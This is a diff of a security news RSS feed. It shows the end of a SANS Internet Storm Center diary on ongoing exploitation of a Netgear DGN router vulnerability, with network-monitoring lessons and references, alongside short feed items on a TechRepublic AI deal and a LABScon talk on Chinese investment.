-&lt;p&gt;The fact that we are still seeing what is now CVE-2024-12847 actively being exploited in the wild as much as it is isn&amp;rsquo;t all that surprising. Many people choose to keep their older hardware for as long as possible because, perhaps they cannot afford to replace it, and/or they do not realize the importance of patching regularly or upgrading when needed. Personally, I know VERY few people who check to see if their router needs updated firmware at least once a month. One of the potential benefits of using equipment provided by the Internet Service Provider(s) is they will often push these firmware updates to customer equipment, but that might not always be guaranteed, so it is worth double checking. And if the customer purchases their own equipment, it is their responsibility to keep it patched.&lt;br /&gt;
-&amp;nbsp;&lt;br /&gt;
-This graphic shows how many of these URLs the Internet Storm Center has seen over the past year: [&lt;a href="https://isc.sans.edu/weblogs/urlhistory.html?url=L3NldHVwLmNnaQ=="&gt;13&lt;/a&gt;]&lt;/p&gt;
-
-&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/David_Watson_pic8.png" style="width: 800px; height: 236px;" /&gt;&lt;/p&gt;
-
-&lt;p&gt;What do we glean from this? Outdated systems remain vulnerable long after their official support has ended. Despite being labeled as &amp;ldquo;end of service&amp;rdquo;, devices like the Netgear DGN1000 and DGN2200v1 (and probably many more Internet of Things (IoT) devices) continue to present significant security risks that can and will be exploited if appropriate measures are not taken.&lt;/p&gt;
-
-&lt;p&gt;My ultimate point in writing this is about the lessons I learned during this internship, in comprehensive network monitoring and data capture. Without the combination of detailed logging combined with things like packet captures and Zeek logs, these things can sometimes slip under the radar, leaving networks exposed. The ability to correlate events across different logs, as shown with Zeek in this case, was crucial in identifying and understanding the scope of the attack and understanding how to remediate and patch vulnerabilities.&lt;/p&gt;
-
-&lt;p&gt;I read an article earlier today that gave me a chuckle, titled &amp;ldquo;I paid $250,000 to learn forensics&amp;hellip; and still don&amp;rsquo;t know forensics&amp;hellip; [&lt;a href="https://brettshavers.com/brett-s-blog/entry/i-paid-100-000-to-learn-forensics-and-still-dont-know-forensics"&gt;12&lt;/a&gt;]. Looking past the forensics title (and the humor), I think this applies to all of cybersecurity in general. Threats are constantly evolving, making this a field that demands continuous learning and adaptation. As soon as we become complacent, we risk failing to protect and defend our networks effectively. There is no definitive endpoint where we can say we &amp;ldquo;fully know&amp;rdquo; network security, threat hunting, incident response, etc. It is a lifelong journey, and one which I am extremely excited to be on. I will close this out with a phrase that has always stuck in my mind ever since my time in the Marines, and feel it is very applicable here. &amp;ldquo;Complacency kills&amp;rdquo; (and leaves networks vulnerable). One more thing, someone go buy Grandma a new router!&lt;/p&gt;
-
-&lt;p&gt;[1] https://www.sans.org/cyber-security-courses/network-monitoring-threat-detection/&lt;br /&gt;
-[2] https://www.exploit-db.com/exploits/25978&lt;br /&gt;
-[3] https://www.exploit-db.com/exploits/43055&lt;br /&gt;
-[4] https://www.netgear.com/support/product/dgn2200v1/&lt;br /&gt;
-[5] https://www.netgear.com/support/product/dgn1000/&lt;br /&gt;
-[6] https://isc.sans.edu/diary/The+Curious+Case+of+a+12YearOld+Netgear+Router+Vulnerability/31592&lt;br /&gt;
-[7] https://nvd.nist.gov/vuln/detail/CVE-2024-12847&lt;br /&gt;
-[8] https://kb.netgear.com/2649/NETGEAR-Open-Source-Code-for-Programmers-GPL&lt;br /&gt;
-[9] https://www.ibm.com/docs/en/i/7.5?topic=extensions-standard-c-library-functions-table-by-name&lt;br /&gt;
-[10] https://github.com/radareorg/radare2&lt;br /&gt;
-[11] https://c-for-dummies.com/blog/?p=1418&lt;br /&gt;
-[12] https://brettshavers.com/brett-s-blog/entry/i-paid-100-000-to-learn-forensics-and-still-dont-know-forensics&lt;br /&gt;
-[13] https://isc.sans.edu/weblogs/urlhistory.html?url=L3NldHVwLmNnaQ==&lt;br /&gt;
-[14] https://thehackernews.com/2024/11/androxgh0st-malware-integrates-mozi.html&lt;br /&gt;
-[15] https://www.sans.edu/cyber-security-programs/bachelors-degree/&lt;/p&gt;
-
-&lt;p&gt;-----------&lt;br /&gt;
-Guy Bruneau &lt;a href="http://www.ipss.ca/"&gt;IPSS Inc.&lt;/a&gt;&lt;br /&gt;
-&lt;a href="https://handlers.sans.org/gbruneau/"&gt;My Handler Page&lt;/a&gt;&lt;br /&gt;
-Twitter: &lt;a href="https://twitter.com/guybruneau"&gt;GuyBruneau&lt;/a&gt;&lt;br /&gt;
-gbruneau at isc dot sans dot edu&lt;/p&gt;
-
- 
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31638</guid></item><item><title>This $40 Subscription Will Bring AI Into Your Business</title><link>https://www.techrepublic.com/article/1minai-pro-plan-lifetime-subscription/</link><description>Tap into the power of OpenAI, Meta, Midjourney, and additional powerful AI models with 1min.AI, on sale for nearly $200 off now at TechRepublic Academy.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4248378</guid><category>Artificial Intelligence</category><category>Tech &amp; Work</category><category>TR Academy</category><category>1minai tool</category><category>all in one ai tool</category><category>artificial intelligence</category><category>artificial intelligence tool</category></item><item><title>LABScon24 Replay | Follow the Money: Uncovering the Incorporation and the CCP’s Ownership of Chinese Firms Investing in the USA</title><link>https://www.sentinelone.com/labs/labscon24-replay-follow-the-money-uncovering-the-incorporation-and-the-ccps-ownership-of-chinese-firms-investing-in-the-usa/</link><description>Chinese foreign direct investment should trigger American national security concerns, but much of it doesn’t. Elly Rostoum reveals why.</description><content:encoded>&lt;p&gt;&lt;span style="letter-spacing: 0px;"&gt;Chinese foreign direct investment should trigger American national security concerns, but much of it doesn’t. In this ‘behind closed doors’ talk at LABScon 24, Elly Rostoum reveals why and what can be done to improve our understanding of the influence of Chinese FDI.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;It remains unclear if the new White House administration will push forward with the requirements. The Commerce action was mandated as part of an executive order President Trump issued a day before leaving office in January 2021.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=70065</guid><category>A Little Sunshine</category><category>Ne'er-Do-Well News</category><category>Time to Patch</category><category>Web Fraud 2.0</category><category>ACB Group</category><category>Amazon AWS</category><category>Anjie CDN</category><category>Crowell &amp; Moring LLP</category><category>Fangneng CDN</category><category>Funnull</category><category>infrastructure laundering</category><category>Microsoft Azure</category><category>NETSCOUT</category><category>NoName057(16)</category><category>polyfill</category><category>Richard Hummel</category><category>Silent Push</category><category>Suncity Group</category><category>U.S. Department of Commerce</category><category>Zach Edwards</category></item><item><title>This $40 Subscription Will Bring AI Into Your Business</title><link>https://www.techrepublic.com/article/1minai-pro-plan-lifetime-subscription/</link><description>Tap into the power of OpenAI, Meta, Midjourney, and additional powerful AI models with 1min.AI, on sale for nearly $200 off now at TechRepublic Academy.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4248378</guid><category>Artificial Intelligence</category><category>Tech &amp; Work</category><category>TR Academy</category><category>1minai tool</category><category>all in one ai tool</category><category>artificial intelligence</category><category>artificial intelligence tool</category></item><item><title>LABScon24 Replay | Follow the Money: Uncovering the Incorporation and the CCP’s Ownership of Chinese Firms Investing in the USA</title><link>https://www.sentinelone.com/labs/labscon24-replay-follow-the-money-uncovering-the-incorporation-and-the-ccps-ownership-of-chinese-firms-investing-in-the-usa/</link><description>Chinese foreign direct investment should trigger American national security concerns, but much of it doesn’t. Elly Rostoum reveals why.</description><content:encoded>&lt;p&gt;&lt;span style="letter-spacing: 0px;"&gt;Chinese foreign direct investment should trigger American national security concerns, but much of it doesn’t. In this ‘behind closed doors’ talk at LABScon 24, Elly Rostoum reveals why and what can be done to improve our understanding of the influence of Chinese FDI.&lt;/span&gt;&lt;/p&gt;
 &lt;p&gt;Chinese foreign direct investment (FDI) enabled the technology revolution in China and set China as a strategic competitor to the United States. It opened new global markets, redrew trade routes, tapped into intellectual property, allowed for opportunities in industrial espionage, reshaped supply chains, and allowed for technological breakthroughs in genomics, quantum computing, artificial intelligence, and other critical and emerging technologies that are quite simply re-imagining the world.&lt;/p&gt;
 &lt;p&gt;But who exactly owns the Chinese firms undertaking this FDI?&lt;/p&gt;
 &lt;p&gt;The research presented by &lt;a href="https://www.labscon.io/speakers/elly-rostoum/" rel="noopener" target="_blank"&gt;Elly Rostoum&lt;/a&gt; in this LABScon 2024 keynote address tracks the incorporation structures and ownership of the 672 Chinese firms undertaking FDI globally.&lt;/p&gt;
